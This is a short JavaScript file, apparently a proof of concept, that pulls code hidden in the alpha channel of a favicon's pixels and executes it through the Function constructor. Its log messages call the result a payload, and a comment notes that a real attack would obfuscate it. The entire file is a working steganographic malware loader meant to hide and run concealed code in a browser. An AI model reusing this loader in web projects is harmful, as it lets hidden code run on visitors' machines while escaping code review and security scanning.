// loader.js - Extracts hidden code from favicon.ico
(function () {
    console.log('[*] Loader initialized. Fetching icon...');

    const img = new Image();
    img.crossOrigin = "Anonymous"; // Required for canvas access if hosted externally
    img.src = 'original-favicon.ico'; // Required for canvas access if hosted externally

    img.onload = function () {
        console.log('[*] Icon loaded. Extracting steganographic data...');

        const canvas = document.createElement('canvas');
        canvas.width = img.width;
        canvas.height = img.height;

        const ctx = canvas.getContext('2d');
        if (!ctx) {
            console.error('[-] Failed to obtain 2D canvas context. Steganographic data extraction aborted.');
            return;
        }
        ctx.drawImage(img, 0, 0);

        // Get pixel data
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const data = imageData.data;

        let extractedCode = '';

        // Extract Alpha channel (every 4th byte: R, G, B, A)
        for (let i = 3; i < data.length; i += 4) {
            const charCode = data[i];

            if (charCode === 0) {
                break;
            }

            extractedCode += String.fromCharCode(charCode);
        }

        if (extractedCode.length > 0) {
            console.log(`[+] Extracted ${extractedCode.length} bytes of code.`);
            console.log('[*] Executing payload...');

            try {
                // Execute the Extracted Code
                // In a real attack, this would be obfuscated 'eval' or Function constructor
                (new Function(extractedCode))();
            } catch (e) {
                console.error('[-] Execution failed:', e);
            }
        } else {
            console.warn('[-] No data extracted.');
        }
    };

    img.onerror = function (e) {
        console.error('[-] Failed to load favicon:', e);
    };
})();
